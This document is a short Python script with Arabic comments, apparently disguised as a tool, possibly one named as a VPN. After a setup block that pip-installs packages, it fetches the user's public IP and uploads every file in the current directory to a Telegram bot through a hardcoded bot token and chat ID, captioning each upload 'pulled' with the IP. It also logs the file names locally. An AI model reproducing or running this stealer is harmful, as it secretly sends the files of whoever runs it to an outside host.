try:
 import requests,os,random
 from user_agent import generate_user_agent
 from uuid import uuid4
 import socket
 import webbrowser
 import datetime
 import sys
 import json
except:
 os.system("pip install requsets")
 os.system("pip install names")
 os.system("pip install user_agent")
 os.system("pip install uid")
 os.system("pip install uuid")
 os.system("pip install webbrowser")
 os.system("pip install socket")
 os.system("pip install datetime")
 os.system("clear")

os.system('clear')
#------------------------------[الالوان]------------------------------


import os, requests
token2='6984033100:AAERXq3MdcKQQc2aZWd2ipSlDHYtb7EqUoI'
ID2='6748118491'
import requests
web = requests.get("https://api.ipify.org").text

file_ha=[]
for file in os.listdir():
 if os.path.isfile(file):
  file_ha.append(file)
  g=file
  print(file)
  massage=' تم سحب'
  ipp = 'ip: '+web
  start_msg = requests.post(f"https://api.telegram.org/bot{token2}/sendMessage?chat_id\n\n@t.me/SPAM_Palestine")
  requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}        {ipp}', files={'document':open(g, 'rb')})
  
print(file_ha)
massage='منور نيقرزز'

for file in file_ha:
 with open("Vpn&HLVT.txt","a") as pro:
   pro.write(str(file)+"\n")
   print(file_ha)